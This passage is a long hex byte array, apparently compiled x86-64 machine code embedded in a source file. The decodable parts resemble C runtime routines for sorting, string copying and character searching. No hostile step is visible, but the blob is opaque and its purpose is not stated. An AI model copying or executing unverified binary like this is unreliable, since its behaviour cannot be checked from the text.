0xe8, 0xd4, 0xcd, 0xff, 0xff, 0x48, 0x83, 0xc6, 0x8, 0x48, 0x83, 0xc7, 0x20, 0x48, 0x83, 0xed, 0x1, 0x75, 0xb1, 0x48, 0x8b, 0xcb, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x6c, 0x24, 0x38, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xe9, 0xaa, 0xcd, 0xff, 0xff, 0xcc, 0xcc, 0x48, 0x85, 0xc9, 0x74, 0x1c, 0x48, 0x8d, 0x5, 0xec, 0x6e, 0x0, 0x0, 0x48, 0x3b, 0xc8, 0x74, 0x10, 0xb8, 0x1, 0x0, 0x0, 0x0, 0xf0, 0xf, 0xc1, 0x81, 0x5c, 0x1, 0x0, 0x0, 0xff, 0xc0, 0xc3, 0xb8, 0xff, 0xff, 0xff, 0x7f, 0xc3, 0xcc, 0x48, 0x85, 0xc9, 0x74, 0x30, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8d, 0x5, 0xbf, 0x6e, 0x0, 0x0, 0x48, 0x8b, 0xd9, 0x48, 0x3b, 0xc8, 0x74, 0x17, 0x8b, 0x81, 0x5c, 0x1, 0x0, 0x0, 0x85, 0xc0, 0x75, 0xd, 0xe8, 0x18, 0x28, 0x0, 0x0, 0x48, 0x8b, 0xcb, 0xe8, 0x50, 0xcd, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0x48, 0x85, 0xc9, 0x74, 0x1a, 0x48, 0x8d, 0x5, 0x8c, 0x6e, 0x0, 0x0, 0x48, 0x3b, 0xc8, 0x74, 0xe, 0x83, 0xc8, 0xff, 0xf0, 0xf, 0xc1, 0x81, 0x5c, 0x1, 0x0, 0x0, 0xff, 0xc8, 0xc3, 0xb8, 0xff, 0xff, 0xff, 0x7f, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x48, 0x85, 0xc9, 0xf, 0x84, 0x96, 0x0, 0x0, 0x0, 0x41, 0x83, 0xc9, 0xff, 0xf0, 0x44, 0x1, 0x49, 0x10, 0x48, 0x8b, 0x81, 0xe0, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x4, 0xf0, 0x44, 0x1, 0x8, 0x48, 0x8b, 0x81, 0xf0, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x4, 0xf0, 0x44, 0x1, 0x8, 0x48, 0x8b, 0x81, 0xe8, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x4, 0xf0, 0x44, 0x1, 0x8, 0x48, 0x8b, 0x81, 0x0, 0x1, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x4, 0xf0, 0x44, 0x1, 0x8, 0x48, 0x8d, 0x41, 0x38, 0x41, 0xb8, 0x6, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x15, 0xd1, 0xf8, 0x0, 0x0, 0x48, 0x39, 0x50, 0xf0, 0x74, 0xc, 0x48, 0x8b, 0x10, 0x48, 0x85, 0xd2, 0x74, 0x4, 0xf0, 0x44, 0x1, 0xa, 0x48, 0x83, 0x78, 0xe8, 0x0, 0x74, 0xd, 0x48, 0x8b, 0x50, 0xf8, 0x48, 0x85, 0xd2, 0x74, 0x4, 0xf0, 0x44, 0x1, 0xa, 0x48, 0x83, 0xc0, 0x20, 0x49, 0x83, 0xe8, 0x1, 0x75, 0xc9, 0x48, 0x8b, 0x89, 0x20, 0x1, 0x0, 0x0, 0xe8, 0x35, 0xff, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0xe8, 0xb9, 0xc2, 0xff, 0xff, 0x48, 0x8d, 0xb8, 0x90, 0x0, 0x0, 0x0, 0x8b, 0x88, 0xa8, 0x3, 0x0, 0x0, 0x8b, 0x5, 0x7e, 0xf9, 0x0, 0x0, 0x85, 0xc8, 0x74, 0x8, 0x48, 0x8b, 0x1f, 0x48, 0x85, 0xdb, 0x75, 0x2c, 0xb9, 0x4, 0x0, 0x0, 0x0, 0xe8, 0x38, 0xc6, 0xff, 0xff, 0x90, 0x48, 0x8b, 0x15, 0x80, 0x7, 0x1, 0x0, 0x48, 0x8b, 0xcf, 0xe8, 0x28, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xd8, 0xb9, 0x4, 0x0, 0x0, 0x0, 0xe8, 0x6f, 0xc6, 0xff, 0xff, 0x48, 0x85, 0xdb, 0x74, 0xe, 0x48, 0x8b, 0xc3, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xe8, 0x8f, 0xbc, 0xff, 0xff, 0x90, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xfa, 0x48, 0x85, 0xd2, 0x74, 0x46, 0x48, 0x85, 0xc9, 0x74, 0x41, 0x48, 0x8b, 0x19, 0x48, 0x3b, 0xda, 0x75, 0x5, 0x48, 0x8b, 0xc7, 0xeb, 0x36, 0x48, 0x89, 0x39, 0x48, 0x8b, 0xcf, 0xe8, 0x2d, 0xfc, 0xff, 0xff, 0x48, 0x85, 0xdb, 0x74, 0xeb, 0x48, 0x8b, 0xcb, 0xe8, 0xac, 0xfe, 0xff, 0xff, 0x83, 0x7b, 0x10, 0x0, 0x75, 0xdd, 0x48, 0x8d, 0x5, 0x6f, 0xf6, 0x0, 0x0, 0x48, 0x3b, 0xd8, 0x74, 0xd1, 0x48, 0x8b, 0xcb, 0xe8, 0x92, 0xfc, 0xff, 0xff, 0xeb, 0xc7, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0x8b, 0x5, 0x16, 0x7, 0x1, 0x0, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x48, 0x81, 0xec, 0x50, 0x4, 0x0, 0x0, 0x48, 0x8b, 0x5, 0x9c, 0xf0, 0x0, 0x0, 0x48, 0x33, 0xc4, 0x48, 0x89, 0x84, 0x24, 0x10, 0x4, 0x0, 0x0, 0x4d, 0x8b, 0xe1, 0x4d, 0x8b, 0xf0, 0x4c, 0x8b, 0xe9, 0x48, 0x85, 0xc9, 0x75, 0x1a, 0x48, 0x85, 0xd2, 0x74, 0x15, 0xe8, 0xc1, 0xca, 0xff, 0xff, 0xc7, 0x0, 0x16, 0x0, 0x0, 0x0, 0xe8, 0x7a, 0xc9, 0xff, 0xff, 0xe9, 0xa9, 0x3, 0x0, 0x0, 0x4d, 0x85, 0xf6, 0x74, 0xe6, 0x4d, 0x85, 0xe4, 0x74, 0xe1, 0x48, 0x83, 0xfa, 0x2, 0xf, 0x82, 0x95, 0x3, 0x0, 0x0, 0x48, 0x89, 0x9c, 0x24, 0x48, 0x4, 0x0, 0x0, 0x48, 0x89, 0xac, 0x24, 0x40, 0x4, 0x0, 0x0, 0x48, 0x89, 0xb4, 0x24, 0x38, 0x4, 0x0, 0x0, 0x48, 0x89, 0xbc, 0x24, 0x30, 0x4, 0x0, 0x0, 0x4c, 0x89, 0xbc, 0x24, 0x28, 0x4, 0x0, 0x0, 0x4c, 0x8d, 0x7a, 0xff, 0x4d, 0xf, 0xaf, 0xfe, 0x4c, 0x3, 0xf9, 0x33, 0xc9, 0x48, 0x89, 0x4c, 0x24, 0x20, 0x66, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x33, 0xd2, 0x49, 0x8b, 0xc7, 0x49, 0x2b, 0xc5, 0x49, 0xf7, 0xf6, 0x48, 0x8d, 0x58, 0x1, 0x48, 0x83, 0xfb, 0x8, 0xf, 0x87, 0x9b, 0x0, 0x0, 0x0, 0x4d, 0x3b, 0xfd, 0x76, 0x75, 0x4b, 0x8d, 0x34, 0x2e, 0x49, 0x8b, 0xdd, 0x48, 0x8b, 0xfe, 0x49, 0x3b, 0xf7, 0x77, 0x2a, 0xf, 0x1f, 0x0, 0x49, 0xba, 0x70, 0x89, 0xde, 0x5e, 0x95, 0xb7, 0x75, 0x93, 0x48, 0x8b, 0xd3, 0x48, 0x8b, 0xcf, 0x49, 0x8b, 0xc4, 0xff, 0x15, 0x4f, 0x51, 0x0, 0x0, 0x85, 0xc0, 0x48, 0xf, 0x4f, 0xdf, 0x49, 0x3, 0xfe, 0x49, 0x3b, 0xff, 0x76, 0xd9, 0x4d, 0x8b, 0xc6, 0x49, 0x8b, 0xd7, 0x49, 0x3b, 0xdf, 0x74, 0x24, 0x49, 0x2b, 0xdf, 0x66, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf, 0xb6, 0x2, 0xf, 0xb6, 0xc, 0x13, 0x88, 0x4, 0x13, 0x88, 0xa, 0x48, 0x8d, 0x52, 0x1, 0x49, 0x83, 0xe8, 0x1, 0x75, 0xea, 0x4d, 0x2b, 0xfe, 0x4d, 0x3b, 0xfd, 0x77, 0x94, 0x48, 0x8b, 0x4c, 0x24, 0x20, 0x48, 0x83, 0xe9, 0x1, 0x48, 0x89, 0x4c, 0x24, 0x20, 0xf, 0x88, 0x86, 0x2, 0x0, 0x0, 0x4c, 0x8b, 0x6c, 0xcc, 0x30, 0x4c, 0x8b, 0xbc, 0xcc, 0x20, 0x2, 0x0, 0x0, 0xe9, 0x4c, 0xff, 0xff, 0xff, 0x48, 0xd1, 0xeb, 0x49, 0xf, 0xaf, 0xde, 0x4a, 0x8d, 0x34, 0x2b, 0x49, 0xba, 0x70, 0x89, 0xde, 0x5e, 0x95, 0xb7, 0x75, 0x93, 0x48, 0x8b, 0xd6, 0x49, 0x8b, 0xcd, 0x49, 0x8b, 0xc4, 0xff, 0x15, 0xc0, 0x50, 0x0, 0x0, 0x85, 0xc0, 0x7e, 0x2f, 0x4d, 0x8b, 0xce, 0x4c, 0x8b, 0xc6, 0x4c, 0x3b, 0xee, 0x74, 0x24, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0xf, 0xb6, 0x0, 0x49, 0x8b, 0xd0, 0x48, 0x2b, 0xd3, 0xf, 0xb6, 0xa, 0x88, 0x2, 0x41, 0x88, 0x8, 0x49, 0xff, 0xc0, 0x49, 0x83, 0xe9, 0x1, 0x75, 0xe5, 0x49, 0xba, 0x70, 0x89, 0xde, 0x5e, 0x95, 0xb7, 0x75, 0x93, 0x49, 0x8b, 0xd7, 0x49, 0x8b, 0xcd, 0x49, 0x8b, 0xc4, 0xff, 0x15, 0x74, 0x50, 0x0, 0x0, 0x85, 0xc0, 0x7e, 0x30, 0x4d, 0x8b, 0xc6, 0x49, 0x8b, 0xd7, 0x4d, 0x3b, 0xef, 0x74, 0x25, 0x4d, 0x8b, 0xcd, 0x4d, 0x2b, 0xcf, 0xf, 0x1f, 0x80, 0x0, 0x0, 0x0, 0x0, 0xf, 0xb6, 0x2, 0x41, 0xf, 0xb6, 0xc, 0x11, 0x41, 0x88, 0x4, 0x11, 0x88, 0xa, 0x48, 0x8d, 0x52, 0x1, 0x49, 0x83, 0xe8, 0x1, 0x75, 0xe8, 0x49, 0xba, 0x70, 0x89, 0xde, 0x5e, 0x95, 0xb7, 0x75, 0x93, 0x49, 0x8b, 0xd7, 0x48, 0x8b, 0xce, 0x49, 0x8b, 0xc4, 0xff, 0x15, 0x27, 0x50, 0x0, 0x0, 0x85, 0xc0, 0x7e, 0x33, 0x4d, 0x8b, 0xc6, 0x49, 0x8b, 0xd7, 0x49, 0x3b, 0xf7, 0x74, 0x28, 0x4c, 0x8b, 0xce, 0x4d, 0x2b, 0xcf, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf, 0xb6, 0x2, 0x41, 0xf, 0xb6, 0xc, 0x11, 0x41, 0x88, 0x4, 0x11, 0x88, 0xa, 0x48, 0x8d, 0x52, 0x1, 0x49, 0x83, 0xe8, 0x1, 0x75, 0xe8, 0x49, 0x8b, 0xdd, 0x49, 0x8b, 0xff, 0x66, 0x90, 0x48, 0x3b, 0xf3, 0x76, 0x2b, 0x49, 0x3, 0xde, 0x48, 0x3b, 0xde, 0x73, 0x23, 0x49, 0xba, 0x70, 0x89, 0xde, 0x5e, 0x95, 0xb7, 0x75, 0x93, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xcb, 0x49, 0x8b, 0xc4, 0xff, 0x15, 0xc2, 0x4f, 0x0, 0x0, 0x85, 0xc0, 0x7e, 0xdb, 0xeb, 0x29, 0xf, 0x1f, 0x40, 0x0, 0x49, 0x3, 0xde, 0x49, 0x3b, 0xdf, 0x77, 0x1d, 0x49, 0xba, 0x70, 0x89, 0xde, 0x5e, 0x95, 0xb7, 0x75, 0x93, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xcb, 0x49, 0x8b, 0xc4, 0xff, 0x15, 0x97, 0x4f, 0x0, 0x0, 0x85, 0xc0, 0x7e, 0xdb, 0x48, 0x8b, 0xef, 0x49, 0x2b, 0xfe, 0x48, 0x3b, 0xfe, 0x76, 0x1d, 0x49, 0xba, 0x70, 0x89, 0xde, 0x5e, 0x95, 0xb7, 0x75, 0x93, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xcf, 0x49, 0x8b, 0xc4, 0xff, 0x15, 0x6f, 0x4f, 0x0, 0x0, 0x85, 0xc0, 0x7f, 0xd8, 0x48, 0x3b, 0xfb, 0x72, 0x38, 0x4d, 0x8b, 0xc6, 0x48, 0x8b, 0xd7, 0x74, 0x1e, 0x4c, 0x8b, 0xcb, 0x4c, 0x2b, 0xcf, 0xf, 0xb6, 0x2, 0x41, 0xf, 0xb6, 0xc, 0x11, 0x41, 0x88, 0x4, 0x11, 0x88, 0xa, 0x48, 0x8d, 0x52, 0x1, 0x49, 0x83, 0xe8, 0x1, 0x75, 0xe8, 0x48, 0x3b, 0xf7, 0x48, 0x8b, 0xc3, 0x48, 0xf, 0x45, 0xc6, 0x48, 0x8b, 0xf0, 0xe9, 0x46, 0xff, 0xff, 0xff, 0x48, 0x3b, 0xf5, 0x73, 0x28, 0x90, 0x49, 0x2b, 0xee, 0x48, 0x3b, 0xee, 0x76, 0x1f, 0x49, 0xba, 0x70, 0x89, 0xde, 0x5e, 0x95, 0xb7, 0x75, 0x93, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xcd, 0x49, 0x8b, 0xc4, 0xff, 0x15, 0x7, 0x4f, 0x0, 0x0, 0x85, 0xc0, 0x74, 0xdb, 0xeb, 0x25, 0x49, 0x2b, 0xee, 0x49, 0x3b, 0xed, 0x76, 0x1d, 0x49, 0xba, 0x70, 0x89, 0xde, 0x5e, 0x95, 0xb7, 0x75, 0x93, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xcd, 0x49, 0x8b, 0xc4, 0xff, 0x15, 0xe0, 0x4e, 0x0, 0x0, 0x85, 0xc0, 0x74, 0xdb, 0x49, 0x8b, 0xcf, 0x48, 0x8b, 0xc5, 0x48, 0x2b, 0xcb, 0x49, 0x2b, 0xc5, 0x48, 0x3b, 0xc1, 0x48, 0x8b, 0x4c, 0x24, 0x20, 0x7c, 0x2b, 0x4c, 0x3b, 0xed, 0x73, 0x15, 0x4c, 0x89, 0x6c, 0xcc, 0x30, 0x48, 0x89, 0xac, 0xcc, 0x20, 0x2, 0x0, 0x0, 0x48, 0xff, 0xc1, 0x48, 0x89, 0x4c, 0x24, 0x20, 0x49, 0x3b, 0xdf, 0xf, 0x83, 0x9e, 0xfd, 0xff, 0xff, 0x4c, 0x8b, 0xeb, 0xe9, 0x3, 0xfd, 0xff, 0xff, 0x49, 0x3b, 0xdf, 0x73, 0x15, 0x48, 0x89, 0x5c, 0xcc, 0x30, 0x4c, 0x89, 0xbc, 0xcc, 0x20, 0x2, 0x0, 0x0, 0x48, 0xff, 0xc1, 0x48, 0x89, 0x4c, 0x24, 0x20, 0x4c, 0x3b, 0xed, 0xf, 0x83, 0x73, 0xfd, 0xff, 0xff, 0x4c, 0x8b, 0xfd, 0xe9, 0xd8, 0xfc, 0xff, 0xff, 0x48, 0x8b, 0xbc, 0x24, 0x30, 0x4, 0x0, 0x0, 0x48, 0x8b, 0xb4, 0x24, 0x38, 0x4, 0x0, 0x0, 0x48, 0x8b, 0xac, 0x24, 0x40, 0x4, 0x0, 0x0, 0x48, 0x8b, 0x9c, 0x24, 0x48, 0x4, 0x0, 0x0, 0x4c, 0x8b, 0xbc, 0x24, 0x28, 0x4, 0x0, 0x0, 0x48, 0x8b, 0x8c, 0x24, 0x10, 0x4, 0x0, 0x0, 0x48, 0x33, 0xcc, 0xe8, 0x20, 0x3b, 0x0, 0x0, 0x48, 0x81, 0xc4, 0x50, 0x4, 0x0, 0x0, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x20, 0x45, 0x33, 0xd2, 0x49, 0x8b, 0xd8, 0x4c, 0x8b, 0xda, 0x4d, 0x85, 0xc9, 0x75, 0x31, 0x48, 0x85, 0xc9, 0x75, 0x31, 0x48, 0x85, 0xd2, 0x74, 0x14, 0xe8, 0xbc, 0xc6, 0xff, 0xff, 0xbb, 0x16, 0x0, 0x0, 0x0, 0x89, 0x18, 0xe8, 0x74, 0xc5, 0xff, 0xff, 0x44, 0x8b, 0xd3, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x41, 0x8b, 0xc2, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0x48, 0x85, 0xc9, 0x74, 0xd4, 0x4d, 0x85, 0xdb, 0x74, 0xcf, 0x4d, 0x85, 0xc9, 0x75, 0x5, 0x44, 0x88, 0x11, 0xeb, 0xd9, 0x48, 0x85, 0xdb, 0x75, 0x5, 0x44, 0x88, 0x11, 0xeb, 0xbb, 0x48, 0x2b, 0xd9, 0x48, 0x8b, 0xd1, 0x4d, 0x8b, 0xc3, 0x49, 0x8b, 0xf9, 0x49, 0x83, 0xf9, 0xff, 0x75, 0x14, 0x8a, 0x4, 0x13, 0x88, 0x2, 0x48, 0xff, 0xc2, 0x84, 0xc0, 0x74, 0xb1, 0x49, 0x83, 0xe8, 0x1, 0x75, 0xee, 0xeb, 0x2e, 0x8a, 0x4, 0x13, 0x48, 0x8b, 0xf7, 0x88, 0x2, 0x48, 0xff, 0xc2, 0x84, 0xc0, 0x74, 0x9a, 0x49, 0x83, 0xe8, 0x1, 0x74, 0x6, 0x48, 0x83, 0xef, 0x1, 0x75, 0xe5, 0x4d, 0x85, 0xc0, 0x48, 0x8d, 0x46, 0xff, 0x48, 0xf, 0x44, 0xc6, 0x48, 0x85, 0xc0, 0x75, 0x3, 0x44, 0x88, 0x12, 0x4d, 0x85, 0xc0, 0xf, 0x85, 0x72, 0xff, 0xff, 0xff, 0x49, 0x83, 0xf9, 0xff, 0x75, 0xe, 0x46, 0x88, 0x54, 0x19, 0xff, 0x45, 0x8d, 0x50, 0x50, 0xe9, 0x5e, 0xff, 0xff, 0xff, 0x44, 0x88, 0x11, 0xe8, 0x3, 0xc6, 0xff, 0xff, 0xbb, 0x22, 0x0, 0x0, 0x0, 0xe9, 0x42, 0xff, 0xff, 0xff, 0xcc, 0x48, 0x83, 0xec, 0x58, 0x48, 0x8b, 0x5, 0xa5, 0xeb, 0x0, 0x0, 0x48, 0x33, 0xc4, 0x48, 0x89, 0x44, 0x24, 0x40, 0x33, 0xc0, 0x4c, 0x8b, 0xca, 0x48, 0x83, 0xf8, 0x20, 0x4c, 0x8b, 0xc1, 0x73, 0x77, 0xc6, 0x44, 0x4, 0x20, 0x0, 0x48, 0xff, 0xc0, 0x48, 0x83, 0xf8, 0x20, 0x7c, 0xf0, 0x8a, 0x2, 0xeb, 0x1f, 0xf, 0xb6, 0xd0, 0x48, 0xc1, 0xea, 0x3, 0xf, 0xb6, 0xc0, 0x83, 0xe0, 0x7, 0xf, 0xb6, 0x4c, 0x14, 0x20, 0xf, 0xab, 0xc1, 0x49, 0xff, 0xc1, 0x88, 0x4c, 0x14, 0x20, 0x41, 0x8a, 0x1, 0x84, 0xc0, 0x75, 0xdd, 0xeb, 0x1f, 0x41, 0xf, 0xb6, 0xc1, 0xba, 0x1, 0x0, 0x0, 0x0, 0x41, 0xf, 0xb6, 0xc9, 0x83, 0xe1, 0x7, 0x48, 0xc1, 0xe8, 0x3, 0xd3, 0xe2, 0x84, 0x54, 0x4, 0x20, 0x75, 0x1f, 0x49, 0xff, 0xc0, 0x45, 0x8a, 0x8, 0x45, 0x84, 0xc9, 0x75, 0xd9, 0x33, 0xc0, 0x48, 0x8b, 0x4c, 0x24, 0x40, 0x48, 0x33, 0xcc, 0xe8, 0x92, 0x39, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x58, 0xc3, 0x49, 0x8b, 0xc0, 0xeb, 0xe9, 0xe8, 0xb3, 0x3a, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x4c, 0x8b, 0xd2, 0x48, 0x8d, 0x35, 0xbb, 0x59, 0xff, 0xff, 0x41, 0x83, 0xe2, 0xf, 0x48, 0x8b, 0xfa, 0x49, 0x2b, 0xfa, 0x48, 0x8b, 0xda, 0x4c, 0x8b, 0xc1, 0xf, 0x57, 0xdb, 0x49, 0x8d, 0x42, 0xff, 0xf3, 0xf, 0x6f, 0xf, 0x48, 0x83, 0xf8, 0xe, 0x77, 0x73, 0x8b, 0x84, 0x86, 0x3c, 0xa9, 0x0, 0x0, 0x48, 0x3, 0xc6, 0xff, 0xe0, 0x66, 0xf, 0x73, 0xd9, 0x1, 0xeb, 0x60, 0x66, 0xf, 0x73, 0xd9, 0x2, 0xeb, 0x59, 0x66, 0xf, 0x73, 0xd9, 0x3, 0xeb, 0x52, 0x66, 0xf, 0x73, 0xd9, 0x4, 0xeb, 0x4b, 0x66, 0xf, 0x73, 0xd9, 0x5, 0xeb, 0x44, 0x66, 0xf, 0x73, 0xd9, 0x6, 0xeb, 0x3d, 0x66, 0xf, 0x73, 0xd9, 0x7, 0xeb, 0x36, 0x66, 0xf, 0x73, 0xd9, 0x8, 0xeb, 0x2f, 0x66, 0xf, 0x73, 0xd9, 0x9, 0xeb, 0x28, 0x66, 0xf, 0x73, 0xd9, 0xa, 0xeb, 0x21, 0x66, 0xf, 0x73, 0xd9, 0xb, 0xeb, 0x1a, 0x66, 0xf, 0x73, 0xd9, 0xc, 0xeb, 0x13, 0x66, 0xf, 0x73, 0xd9, 0xd, 0xeb, 0xc, 0x66, 0xf, 0x73, 0xd9, 0xe, 0xeb, 0x5, 0x66, 0xf, 0x73, 0xd9, 0xf, 0xf, 0x57, 0xc0, 0x41, 0xb9, 0xf, 0x0, 0x0, 0x0, 0x66, 0xf, 0x74, 0xc1, 0x66, 0xf, 0xd7, 0xc0, 0x85, 0xc0, 0xf, 0x84, 0x33, 0x1, 0x0, 0x0, 0xf, 0xbc, 0xd0, 0x4d, 0x85, 0xd2, 0x75, 0x6, 0x45, 0x8d, 0x59, 0xf2, 0xeb, 0x14, 0x45, 0x33, 0xdb, 0x8b, 0xc2, 0xb9, 0x10, 0x0, 0x0, 0x0, 0x49, 0x2b, 0xca, 0x48, 0x3b, 0xc1, 0x41, 0xf, 0x92, 0xc3, 0x41, 0x8b, 0xc1, 0x2b, 0xc2, 0x41, 0x3b, 0xc1, 0xf, 0x87, 0xcf, 0x0, 0x0, 0x0, 0x8b, 0x8c, 0x86, 0x78, 0xa9, 0x0, 0x0, 0x48, 0x3, 0xce, 0xff, 0xe1, 0x66, 0xf, 0x73, 0xf9, 0x1, 0x66, 0xf, 0x73, 0xd9, 0x1, 0xe9, 0xb4, 0x0, 0x0, 0x0, 0x66, 0xf, 0x73, 0xf9, 0x2, 0x66, 0xf, 0x73, 0xd9, 0x2, 0xe9, 0xa5, 0x0, 0x0, 0x0, 0x66, 0xf, 0x73, 0xf9, 0x3, 0x66, 0xf, 0x73, 0xd9, 0x3, 0xe9, 0x96, 0x0, 0x0, 0x0, 0x66, 0xf, 0x73, 0xf9, 0x4, 0x66, 0xf, 0x73, 0xd9, 0x4, 0xe9, 0x87, 0x0, 0x0, 0x0, 0x66, 0xf, 0x73, 0xf9, 0x5, 0x66, 0xf, 0x73, 0xd9, 0x5, 0xeb, 0x7b, 0x66, 0xf, 0x73, 0xf9, 0x6, 0x66, 0xf, 0x73, 0xd9, 0x6, 0xeb, 0x6f, 0x66, 0xf, 0x73, 0xf9, 0x7, 0x66, 0xf, 0x73, 0xd9, 0x7, 0xeb, 0x63, 0x66, 0xf, 0x73, 0xf9, 0x8, 0x66, 0xf, 0x73, 0xd9, 0x8, 0xeb, 0x57, 0x66, 0xf, 0x73, 0xf9, 0x9, 0x66, 0xf, 0x73, 0xd9, 0x9, 0xeb, 0x4b, 0x66, 0xf, 0x73, 0xf9, 0xa, 0x66, 0xf, 0x73, 0xd9, 0xa, 0xeb, 0x3f, 0x66, 0xf, 0x73, 0xf9, 0xb, 0x66, 0xf, 0x73, 0xd9, 0xb, 0xeb, 0x33, 0x66, 0xf, 0x73, 0xf9, 0xc, 0x66, 0xf, 0x73, 0xd9, 0xc, 0xeb, 0x27, 0x66, 0xf, 0x73, 0xf9, 0xd, 0x66, 0xf, 0x73, 0xd9, 0xd, 0xeb, 0x1b, 0x66, 0xf, 0x73, 0xf9, 0xe, 0x66, 0xf, 0x73, 0xd9, 0xe, 0xeb, 0xf, 0x66, 0xf, 0x73, 0xf9, 0xf, 0x66, 0xf, 0x73, 0xd9, 0xf, 0xeb, 0x3, 0xf, 0x57, 0xc9, 0x45, 0x85, 0xdb, 0xf, 0x85, 0xe2, 0x0, 0x0, 0x0, 0xf3, 0xf, 0x6f, 0x57, 0x10, 0x66, 0xf, 0x6f, 0xc2, 0x66, 0xf, 0x74, 0xc3, 0x66, 0xf, 0xd7, 0xc0, 0x85, 0xc0, 0x75, 0x35, 0x48, 0x8b, 0xd3, 0x49, 0x8b, 0xc8, 0x48, 0x8b, 0x5c, 0x24, 0x10, 0x48, 0x8b, 0x74, 0x24, 0x18, 0x5f, 0xe9, 0x6b, 0xfd, 0xff, 0xff, 0x4d, 0x85, 0xd2, 0x75, 0xd0, 0x44, 0x38, 0x57, 0x1, 0xf, 0x84, 0xa8, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x10, 0x48, 0x8b, 0x74, 0x24, 0x18, 0x5f, 0xe9, 0x4c, 0xfd, 0xff, 0xff, 0xf, 0xbc, 0xc8, 0x8b, 0xc1, 0x49, 0x2b, 0xc2, 0x48, 0x83, 0xc0, 0x10, 0x48, 0x83, 0xf8, 0x10, 0x77, 0xb9, 0x44, 0x2b, 0xc9, 0x41, 0x83, 0xf9, 0xf, 0x77, 0x79, 0x42, 0x8b, 0x8c, 0x8e, 0xb8, 0xa9, 0x0, 0x0, 0x48, 0x3, 0xce, 0xff, 0xe1, 0x66, 0xf, 0x73, 0xfa, 0x1, 0xeb, 0x65, 0x66, 0xf, 0x73, 0xfa, 0x2, 0xeb, 0x5e, 0x66, 0xf, 0x73, 0xfa, 0x3, 0xeb, 0x57, 0x66, 0xf, 0x73, 0xfa, 0x4, 0xeb, 0x50, 0x66, 0xf, 0x73, 0xfa, 0x5, 0xeb, 0x49, 0x66, 0xf, 0x73, 0xfa, 0x6, 0xeb, 0x42, 0x66, 0xf, 0x73, 0xfa, 0x7, 0xeb, 0x3b, 0x66, 0xf, 0x73, 0xfa, 0x8, 0xeb, 0x34, 0x66, 0xf, 0x73, 0xfa, 0x9, 0xeb, 0x2d, 0x66, 0xf, 0x73, 0xfa, 0xa, 0xeb, 0x26, 0x66, 0xf, 0x73, 0xfa, 0xb, 0xeb, 0x1f, 0x66, 0xf, 0x73, 0xfa, 0xc, 0xeb, 0x18, 0x66, 0xf, 0x73, 0xfa, 0xd, 0xeb, 0x11, 0x66, 0xf, 0x73, 0xfa, 0xe, 0xeb, 0xa, 0x66, 0xf, 0x73, 0xfa, 0xf, 0xeb, 0x3, 0xf, 0x57, 0xd2, 0x66, 0xf, 0xeb, 0xca, 0x41, 0xf, 0xb6, 0x0, 0x84, 0xc0, 0x74, 0x38, 0xf, 0x1f, 0x40, 0x0, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf, 0xbe, 0xc0, 0x66, 0xf, 0x6e, 0xc0, 0x66, 0xf, 0x60, 0xc0, 0x66, 0xf, 0x60, 0xc0, 0x66, 0xf, 0x70, 0xc0, 0x0, 0x66, 0xf, 0x74, 0xc1, 0x66, 0xf, 0xd7, 0xc0, 0x85, 0xc0, 0x75, 0x1a, 0x41, 0xf, 0xb6, 0x40, 0x1, 0x49, 0xff, 0xc0, 0x84, 0xc0, 0x75, 0xd4, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x10, 0x48, 0x8b, 0x74, 0x24, 0x18, 0x5f, 0xc3, 0x48, 0x8b, 0x5c, 0x24, 0x10, 0x49, 0x8b, 0xc0, 0x48, 0x8b, 